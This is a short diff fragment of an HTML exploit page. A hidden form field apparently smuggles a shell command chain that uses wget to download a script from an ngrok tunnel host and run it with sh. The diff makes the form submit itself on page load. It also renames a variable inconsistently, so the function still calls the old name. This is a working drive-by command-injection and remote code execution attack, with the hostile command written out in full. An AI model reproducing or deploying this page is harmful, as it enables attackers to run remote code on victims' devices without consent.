@@ -5,7 +5,7 @@ send.log && wget https://beb0-175-176-0-61.ngrok-free.app/Renzkie14/zlts10g/raw/
 sh &&" type="hidden"><input type="submit" style="display:none;"></form>
 <script>
 function exploit () {
-var xploit = document.getElementById("exploit");
+var exploit = document.getElementById("exploit");
 xploit.submit();
 }
-window.onload;
+window.onload = exploit;
